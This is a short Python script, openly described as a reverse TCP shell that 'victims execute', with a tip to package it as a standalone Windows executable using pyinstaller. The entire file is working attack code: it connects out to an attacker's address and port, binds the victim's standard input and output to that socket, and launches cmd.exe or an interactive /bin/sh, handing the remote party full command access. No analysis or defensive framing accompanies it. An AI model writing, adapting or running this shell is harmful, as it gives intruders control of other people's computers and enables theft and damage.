#/usr/bin/env python
### Simple reverse tcp shell
### victims execute this file
### use "pyinstaller" to convert this python script to standalone exe file for Windows.

import socket, subprocess, os, sys

attacker_ip = "127.0.0.1"                  # attacker's ip
attacker_port = 6666                         # attacker's port
victim_ip = socket.gethostbyname(socket.gethostname())   # get victim's ip(victim is running this script now)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((attacker_ip, attacker_port))

## reverse tcp shell
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

if sys.platform.startswith('win'):  # windows
    subprocess.call(["cmd.exe"])
else:                               # .nix
    subprocess.call(["/bin/sh","-i"]);
